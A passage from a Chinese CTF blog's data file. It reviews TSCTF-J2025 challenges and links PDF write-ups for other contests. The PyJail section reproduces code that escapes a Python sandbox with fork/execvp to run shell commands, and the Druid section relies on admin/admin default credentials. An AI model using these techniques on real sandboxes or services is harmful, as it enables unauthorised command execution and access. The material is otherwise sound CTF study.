       x = <span class=\"variable language_\">self</span>.conv3(x)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\"></span><br><span class=\"line\">mynet=Net()</span><br><span class=\"line\">mynet.load_state_dict(torch.load(<span class=\"string\">&#x27;model.pth&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">out = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> line: <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">float</span>, line.split(<span class=\"string\">&#x27; &#x27;</span>))), <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;ciphertext.txt&#x27;</span>).readlines()))</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.array(out)</span><br><span class=\"line\"></span><br><span class=\"line\">out -= mynet.conv3.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_conv</span>(<span class=\"params\">kernel, after, before_size</span>):</span><br><span class=\"line\">    last_line = [<span class=\"number\">0</span>] + [<span class=\"number\">0</span>] * before_size + [<span class=\"number\">0</span>]</span><br><span class=\"line\">    before = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">        line = [<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">            line.append((after[i][j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">0</span>] * last_line[j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">1</span>] * last_line[j+<span class=\"number\">1</span>] - kernel[<span class=\"number\">1</span>][<span class=\"number\">0</span>] * line[-<span class=\"number\">1</span>])/kernel[<span class=\"number\">1</span>][<span class=\"number\">1</span>])</span><br><span class=\"line\">        last_line = line + [<span class=\"number\">0</span>]</span><br><span class=\"line\">        before.append(line[<span class=\"number\">1</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> before</span><br><span class=\"line\"></span><br><span class=\"line\">outl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((<span class=\"number\">2</span>, <span class=\"number\">2</span>)).tolist(), out.tolist(), n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(outl)</span></span><br><span class=\"line\"></span><br><span class=\"line\">lb = mynet.linear.bias.detach().numpy()</span><br><span class=\"line\">lw = mynet.linear.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(lb.shape)</span></span><br><span class=\"line\"><span class=\"comment\"># print(lw.shape)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-<span class=\"number\">1</span>)) - lb))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">w1 = mynet.conv1.weight.detach().numpy()</span><br><span class=\"line\">b1 = mynet.conv1.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\">ori = (out1 - b1).reshape((-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(ori)</span></span><br><span class=\"line\">ajust = [<span class=\"built_in\">round</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ori.tolist()]</span><br><span class=\"line\"><span class=\"comment\"># print(ajust)</span></span><br><span class=\"line\">b = <span class=\"built_in\">sum</span>([[i&amp;<span class=\"number\">1</span>, (i&amp;<span class=\"number\">2</span>)//<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], []) + <span class=\"built_in\">sum</span>([[(i&amp;<span class=\"number\">4</span>)//<span class=\"number\">4</span>, (i&amp;<span class=\"number\">8</span>)//<span class=\"number\">8</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], [])</span><br><span class=\"line\"><span class=\"comment\"># print(b)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(b), <span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, b[i:i+<span class=\"number\">8</span>])), base=<span class=\"number\">2</span>)), end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>注：不过还是学到了东西的，WP里面用的是<code>pinv</code>方法直接求广义逆，但我们高代还没有学到广义逆，我也不知道有这么一个函数，就手动搓了一个 $(W^TW)^{-1}(W^TY)$<br>$$<br>(W^TW)^{-1}(W^TY)\\\\<br>&#x3D;(W^TW)^{-1}(W^T(WX))\\\\<br>&#x3D;(W^TW)^{-1}(W^TW)X\\\\<br>&#x3D;X<br>$$</p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"Druid\"><a href=\"#Druid\" class=\"headerlink\" title=\"Druid\"></a>Druid</h3><p>看到WP之后我是不能理解当时在干什么的……</p>\n<p>admin&#x2F;admin登录之后在数据源里面就有用户名</p>\n<p><img src=\"/image-7.png\" alt=\"alt text\"></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"Catbits\"><a href=\"#Catbits\" class=\"headerlink\" title=\"Catbits\"></a>Catbits</h3><p>那么这道题剩下的那个Toko在哪里呢？答案是：<code>舞台</code>也是可以存放代码的！</p>\n<p>这是在面试的时候学长讲的，WP里面也有，所以只要在角色的右边选舞台就可以看到了</p>\n<p><img src=\"/image-8.png\" alt=\"alt text\"></p>\n<hr>\n\n<p>差不多就写到这吧，马上要上英语课了</p>\n<p>后面有机会的话可能还会写写Reverse里面solves&gt;&#x3D;2的题，以及Pwn的一些题目</p>\n<script>\n  // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","excerpt":"","more":"<p>今天下午不想写作业，就来复盘一下TSCTF-J2025吧~</p>\n<blockquote>\n<p>不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</p>\n<p>如果图炸了的话请手动拼接URL，为</p>\n<p><span id=\"urlNow\"></span>image-编号.png</p>\n</blockquote>\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"Meow\"><a href=\"#Meow\" class=\"headerlink\" title=\"Meow\"></a>Meow</h3><p>Word文档的本质是一个ZIP压缩包，所以可以在里面藏东西，把扩展名改为.zip后解压，可以在<code>[Content_Types].xml</code>文件里看到一行注释</p>\n<p><img src=\"/image.png\" alt=\"alt text\"></p>\n<p>提示了base64的字母表，所以不需要一眼丁真</p>\n<p>做题时因为没有看见异常文件就忽略了这个方向</p>\n<h3 id=\"PyJail\"><a href=\"#PyJail\" class=\"headerlink\" title=\"PyJail\"></a>PyJail</h3><p>感觉自己的第一种解法应该可以做到拿os啊，为什么会触发import钩子呢？</p>\n<p>然后按照WP的方法试了一下，结果发现：是全角字符的问题</p>\n<p><img src=\"/image-1.png\" alt=\"alt text\"></p>\n<p>同样是使用<code>__import__</code>，但是使用Unicode绕过的版本会触发import，而正常半角字符的不会！</p>\n<p>经过实验，发现，是python处理unicode的时候需要先导入unicodedata这个库来支持将形近字转化，这就是最开始用Unicode绕过行不通的原因</p>\n<p><img src=\"/image-2.png\" alt=\"alt text\"></p>\n<p>再来就是后面用os的底层实现来完成指令执行了，可以用<code>execlp</code>&#x2F;<code>execvp</code>来执行，不过还要处理一下<code>fork</code>和<code>pipe</code></p>\n<p>下面是从WP里面复制的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_command</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    r, w = os.pipe()</span><br><span class=\"line\">    pid = os.fork()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pid == <span class=\"number\">0</span>:</span><br><span class=\"line\">        os.close(r)</span><br><span class=\"line\">        os.dup2(w, <span class=\"number\">1</span>)</span><br><span class=\"line\">        os.dup2(w, <span class=\"number\">2</span>)</span><br><span class=\"line\">        os.close(w)</span><br><span class=\"line\">        os.execvp(<span class=\"string\">&quot;/bin/sh&quot;</span>, [<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd])</span><br><span class=\"line\">        os._exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        os.close(w)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> os.fdopen(r) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            output = f.read()</span><br><span class=\"line\">        os.waitpid(pid, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(run_command(<span class=\"string\">&quot;ls -l&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_command</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    pid, fd = os.forkpty()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pid == <span class=\"number\">0</span>:</span><br><span class=\"line\">        os.execvp(<span class=\"string\">&quot;sh&quot;</span>, [<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        output = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                data = os.read(fd, <span class=\"number\">1024</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                output += data</span><br><span class=\"line\">            <span class=\"keyword\">except</span> OSError:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        os.waitpid(pid, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output.decode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(run_command(<span class=\"string\">&quot;ls -l&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h2><h3 id=\"JustReverse\"><a href=\"#JustReverse\" class=\"headerlink\" title=\"JustReverse\"></a>JustReverse</h3><p>对着WP的代码，看了半天，简直一模一样，回去对比了一下输出，发现第一个卷积就错了，仔细一看，不禁破口大骂： <strong>我是**</strong> ，艹，一开始想试一下这个算法对不对，还没有写<code>line</code>这个变量就打算先试试，结果左下角的值算的是写死的0，后来加上了<code>line</code>变量之后忘改了，因为写的太长还没有发现！#@%!#@#@</p>\n<p><img src=\"/image-4.png\" alt=\"alt text\"></p>\n<p>把那个0改成<code>line[-1]</code>，然后就解出答案了……</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-6.png\" alt=\"alt text\"></p>\n<img src=\"image-3.png\">\n<div style=\"text-align:center; font-size: 0.8em;\">《我　裂　开　来》</div>\n\n<p>给出更正后的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">58</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Net</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Net, <span class=\"variable language_\">self</span>).__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.linear = nn.Linear(n, n*n)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv1=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv2=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">1</span>, <span class=\"number\">1</span>), stride=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv3=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.relu=nn.ReLU()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>*n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv1(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.relu(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv2(x)</span><br><span class=\"line\">        x = x.view(n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.linear(x)</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, n, n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv3(x)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\"></span><br><span class=\"line\">mynet=Net()</span><br><span class=\"line\">mynet.load_state_dict(torch.load(<span class=\"string\">&#x27;model.pth&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">out = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> line: <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">float</span>, line.split(<span class=\"string\">&#x27; &#x27;</span>))), <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;ciphertext.txt&#x27;</span>).readlines()))</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.array(out)</span><br><span class=\"line\"></span><br><span class=\"line\">out -= mynet.conv3.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_conv</span>(<span class=\"params\">kernel, after, before_size</span>):</span><br><span class=\"line\">    last_line = [<span class=\"number\">0</span>] + [<span class=\"number\">0</span>] * before_size + [<span class=\"number\">0</span>]</span><br><span class=\"line\">    before = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">        line = [<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">            line.append((after[i][j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">0</span>] * last_line[j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">1</span>] * last_line[j+<span class=\"number\">1</span>] - kernel[<span class=\"number\">1</span>][<span class=\"number\">0</span>] * line[-<span class=\"number\">1</span>])/kernel[<span class=\"number\">1</span>][<span class=\"number\">1</span>])</span><br><span class=\"line\">        last_line = line + [<span class=\"number\">0</span>]</span><br><span class=\"line\">        before.append(line[<span class=\"number\">1</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> before</span><br><span class=\"line\"></span><br><span class=\"line\">outl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((<span class=\"number\">2</span>, <span class=\"number\">2</span>)).tolist(), out.tolist(), n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(outl)</span></span><br><span class=\"line\"></span><br><span class=\"line\">lb = mynet.linear.bias.detach().numpy()</span><br><span class=\"line\">lw = mynet.linear.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(lb.shape)</span></span><br><span class=\"line\"><span class=\"comment\"># print(lw.shape)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-<span class=\"number\">1</span>)) - lb))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">w1 = mynet.conv1.weight.detach().numpy()</span><br><span class=\"line\">b1 = mynet.conv1.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\">ori = (out1 - b1).reshape((-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(ori)</span></span><br><span class=\"line\">ajust = [<span class=\"built_in\">round</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ori.tolist()]</span><br><span class=\"line\"><span class=\"comment\"># print(ajust)</span></span><br><span class=\"line\">b = <span class=\"built_in\">sum</span>([[i&amp;<span class=\"number\">1</span>, (i&amp;<span class=\"number\">2</span>)//<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], []) + <span class=\"built_in\">sum</span>([[(i&amp;<span class=\"number\">4</span>)//<span class=\"number\">4</span>, (i&amp;<span class=\"number\">8</span>)//<span class=\"number\">8</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], [])</span><br><span class=\"line\"><span class=\"comment\"># print(b)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(b), <span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, b[i:i+<span class=\"number\">8</span>])), base=<span class=\"number\">2</span>)), end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>注：不过还是学到了东西的，WP里面用的是<code>pinv</code>方法直接求广义逆，但我们高代还没有学到广义逆，我也不知道有这么一个函数，就手动搓了一个 $(W^TW)^{-1}(W^TY)$<br>$$<br>(W^TW)^{-1}(W^TY)\\\\<br>&#x3D;(W^TW)^{-1}(W^T(WX))\\\\<br>&#x3D;(W^TW)^{-1}(W^TW)X\\\\<br>&#x3D;X<br>$$</p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"Druid\"><a href=\"#Druid\" class=\"headerlink\" title=\"Druid\"></a>Druid</h3><p>看到WP之后我是不能理解当时在干什么的……</p>\n<p>admin&#x2F;admin登录之后在数据源里面就有用户名</p>\n<p><img src=\"/image-7.png\" alt=\"alt text\"></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"Catbits\"><a href=\"#Catbits\" class=\"headerlink\" title=\"Catbits\"></a>Catbits</h3><p>那么这道题剩下的那个Toko在哪里呢？答案是：<code>舞台</code>也是可以存放代码的！</p>\n<p>这是在面试的时候学长讲的，WP里面也有，所以只要在角色的右边选舞台就可以看到了</p>\n<p><img src=\"/image-8.png\" alt=\"alt text\"></p>\n<hr>\n\n<p>差不多就写到这吧，马上要上英语课了</p>\n<p>后面有机会的话可能还会写写Reverse里面solves&gt;&#x3D;2的题，以及Pwn的一些题目</p>\n<script>\n  // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>"},{"title":"NewStar2025 WP(PDF)","date":"2025-11-05T11:25:41.000Z","_content":"\n上传一下NewStar2025的WP\n\n因为从第三周开始咕咕咕了，后面两周几乎没有做几道题，Week5干脆没做了\n\n还有，里面有我手机号，我懒得删了，不要骚扰我（或许可以出成OSINT？）\n\n[Week 1](圆周率WP-Week1.pdf)\n\n[Week 2](圆周率WP-Week2.pdf)\n\n[Week 3](圆周率WP-Week3.pdf)\n\n[Week 4](圆周率WP-Week4.pdf)\n","source":"_posts/NewStar2025-WP-PDF.md","raw":"---\ntitle: NewStar2025 WP(PDF)\ndate: 2025-11-05 19:25:41\ntags:\n---\n\n上传一下NewStar2025的WP\n\n因为从第三周开始咕咕咕了，后面两周几乎没有做几道题，Week5干脆没做了\n\n还有，里面有我手机号，我懒得删了，不要骚扰我（或许可以出成OSINT？）\n\n[Week 1](圆周率WP-Week1.pdf)\n\n[Week 2](圆周率WP-Week2.pdf)\n\n[Week 3](圆周率WP-Week3.pdf)\n\n[Week 4](圆周率WP-Week4.pdf)\n","slug":"NewStar2025-WP-PDF","published":1,"updated":"2025-11-05T11:28:49.440Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3s0004h4vbbq42g3wd","content":"<p>上传一下NewStar2025的WP</p>\n<p>因为从第三周开始咕咕咕了，后面两周几乎没有做几道题，Week5干脆没做了</p>\n<p>还有，里面有我手机号，我懒得删了，不要骚扰我（或许可以出成OSINT？）</p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week1.pdf\">Week 1</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week2.pdf\">Week 2</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week3.pdf\">Week 3</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week4.pdf\">Week 4</a></p>\n","excerpt":"","more":"<p>上传一下NewStar2025的WP</p>\n<p>因为从第三周开始咕咕咕了，后面两周几乎没有做几道题，Week5干脆没做了</p>\n<p>还有，里面有我手机号，我懒得删了，不要骚扰我（或许可以出成OSINT？）</p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week1.pdf\">Week 1</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week2.pdf\">Week 2</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week3.pdf\">Week 3</a></p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP-Week4.pdf\">Week 4</a></p>\n"},{"title":"0xGame2025 WP(PDF)","date":"2025-11-04T07:12:15.000Z","_content":"\n0xGame2025顺利结束！最后拿了个总榜第4，去掉两个没交WP的，最后是第2~\n\n下面给出PDF版的WP，如果有机会的话，再整理到博客上\n\n[Week1.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week2.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week3.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week4.pdf](非校内新生_Week1_圆周率_wp.pdf)\n","source":"_posts/0xGame2025-WP-PDF.md","raw":"---\ntitle: 0xGame2025 WP(PDF)\ndate: 2025-11-04 15:12:15\ntags:\n---\n\n0xGame2025顺利结束！最后拿了个总榜第4，去掉两个没交WP的，最后是第2~\n\n下面给出PDF版的WP，如果有机会的话，再整理到博客上\n\n[Week1.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week2.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week3.pdf](非校内新生_Week1_圆周率_wp.pdf)\n\n[Week4.pdf](非校内新生_Week1_圆周率_wp.pdf)\n","slug":"0xGame2025-WP-PDF","published":1,"updated":"2025-11-04T07:15:26.305Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3s0005h4vb2cuj1kig","content":"<p>0xGame2025顺利结束！最后拿了个总榜第4，去掉两个没交WP的，最后是第2~</p>\n<p>下面给出PDF版的WP，如果有机会的话，再整理到博客上</p>\n<p><a 